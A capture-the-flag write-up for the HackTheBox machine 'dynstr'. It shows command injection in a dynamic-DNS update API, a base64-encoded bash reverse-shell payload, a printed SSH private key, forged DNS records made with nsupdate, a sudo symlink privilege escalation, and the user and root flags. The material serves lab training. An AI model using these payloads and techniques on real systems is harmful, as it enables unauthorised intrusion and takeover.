# dynstr - HackTheBox - Writeup
Linux, 30 Base Points, Medium

## Machine

![‏‏dynstr.JPG](images/dynstr.JPG)

### TL;DR;

To solve this machine, we begin by enumerating open services – finding the ports ```22``` ,```53``` and ```80```.

***User:*** Founding RCE on [no-ip.com](https://www.noip.com/) API: [http://dynamicdns.htb/nic/update?hostname=test.no-ip.htb&myip=10.10.14.1](http://dynamicdns.htb/nic/update?hostname=test.no-ip.htb&myip=10.10.14.1), Get shell as ```www-data``` user, From ```www-data``` we found SSH private key on ```/home/bindmgr``` directory inside ```strace-C62796521.txt``` file.

***Root:*** By running ```sudo -l``` we found we can run the following script as a root  ```/usr/local/bin/bindmgr.sh```, The script copies file as a root, By creating ```ln``` to ```/root/root.txt``` we can read the root flag.

![pwn.JPG](images/pwn.JPG)

## dynstr Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/dynstr]
└──╼ $ nmap -sC -sV -oA nmap/dynstr 10.10.10.244
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-21 22:06 IDT
Nmap scan report for 10.10.10.244
Host is up (0.082s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.39 seconds

```

Let's observe port 80:
![port80.JPG](images/port80.JPG)


By clicking on ```Services``` we can see the following:
![services.JPG](images/services.JPG)

On the bottom of the page we can see domain ```dyna.htb``` and username ```dns```:
![domain.JPG](images/domain.JPG)

On the "Services" section we can see the following hint:
>We are providing dynamic DNS for anyone with the same API as no-ip.com has. Maintaining API conformance helps make clients work properly.

So It means we can work with [no-ip.com](https://www.noip.com/) API (possible with the credentials ```dynadns:sndanyd```).

We can read about that API on [https://www.noip.com/integrate/request](https://www.noip.com/integrate/request).

Let's observe the update request: [http://dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&myip=192.0.2.25](http://dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&myip=192.0.2.25) Or in our case:
[http://dynamicdns.htb/nic/update?hostname=test.no-ip.htb&myip=10.10.14.1](http://dynamicdns.htb/nic/update?hostname=test.no-ip.htb&myip=10.10.14.1)

By sending the request above using Burp we get:

![updatereq.JPG](images/updatereq.JPG)

From [https://www.dnsomatic.com/docs/api](https://www.dnsomatic.com/docs/api) we can understand that ```good 10.10.14.1``` response says that the update was accepted and will be distributed to all linked services.

After little research I figure RCE vuln on the URL above on ```hostname``` argument (which is a mandatory field) as follow:
```http://dynamicdns.htb/nic/update?hostname=`id`"test.no-ip.htb&myip=10.10.14.1```:

![rceid.JPG](images/rceid.JPG)

Now we can get a reverse shell with the following steps:
1. Base64 to rev shell command:
```console
┌─[evyatar@parrot]─[/hackthebox/dynstr]
└──╼ $ echo "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80MjQyIDA+JjEK
```

2. URL Encode ```+``` to ```%2b```:
```YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yMS80MjQyIDA%2bJjEK```

3. Execute the following request to get shell:
```http://dynamicdns.htb/nic/update?hostname=`echo+"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yMS80MjQyIDA%2bJjEK"+|+base64+-d|+bash`"test1.no-ip.htb&myip=10.10.14.1```

And we get shell as ```www-data```:
```console
┌─[evyatar@parrot]─[/hackthebox/dynstr]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from dnsalias.htb [10.10.10.244] 58062
bash: cannot set terminal process group (756): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$ 
```

By enumerating ```/home/bindmgr``` directory we can see the following files:
```console
www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls
ls
C62796521-debugging.script
C62796521-debugging.timing
command-output-C62796521.txt
strace-C62796521.txt
```

The file ```strace-C62796521.txt``` contains the following SSH private key of ```bindmgr``` user:
```C
read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096)
```

Which we can write as follow:
```C
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

```

If we are trying to connect using this SSH private key we got an error, It's happened because```authorized_keys``` contains the following rule:
```console
www-data@dynstr:/home/bindmgr/.ssh$ cat authorized_keys
cat authorized_keys
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen

```

This means we can use this private key only from ```*.infra.dyna.htb```.

So for doing that we need to use [nsupdate](https://linux.die.net/man/8/nsupdate) command which is used to submit Dynamic DNS Update requests.

According ```/var/www/html/nic/update``` we need to use ```nsupdate``` command with the key that located on ```/etc/bind/infra.key``` as follow:
```console
www-data@dynstr:/var/www/html/nic$ nsupdate -k /etc/bind/infra.key
nsupdate -k /etc/bind/infra.key
update add anything.infra.dyna.htb. 86400 A 10.10.14.14
<ENTER>
update add 14.14.10.10.in-addr.arpa. 300 PTR anything.infra.dyna.htb.
send
```

And now we can use the SSH private key:
```console
┌─[evyatar@parrot]─[/hackthebox/dynstr]
└──╼ $ ssh -i id_rsa bindmgr@dyna.htb
Last login: Tue Jun  8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
bindmgr@dynstr:~$ cat user.txt 
cb9cd7793225742db276354d7ef9912f
```

And we get the user flag ```cb9cd7793225742db276354d7ef9912f```

### Root

By running ```sudo -l``` we get the following:
```console
bindmgr@dynstr:/home/dyna$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh

```

Let's observe the file ```/usr/local/bin/bindmgr.sh```:
```bash
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr. 
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else 
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
	systemctl status bind9
    else
	echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
```

So ```cp .version * /etc/bind/named.bindmgr/``` says that we can copy files as root.

If we create ```ln``` from ```.version``` to ```/root/root.txt``` It means we can read files as root.

So let's do it to get the root flag:
```console
bindmgr@dynstr:/tmp/t$ echo "1.4" > .version
bindmgr@dynstr:/tmp/t$ ln -s /root/root.txt ".version"
bindmgr@dynstr:/tmp/t$ sudo /usr/local/bin/bindmgr.sh
ssudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
/usr/local/bin/bindmgr.sh: line 28: [[: 8480cff70b81a72d0e20ff49bf8f2080: value too great for base (error token is "8480cff70b81a72d0e20ff49bf8f2080")
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: -r not specified; omitting directory 'support-case-C62796521'
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/support-case-C62796521: file not found
```

And we can see the root flag ```8480cff70b81a72d0e20ff49bf8f2080```.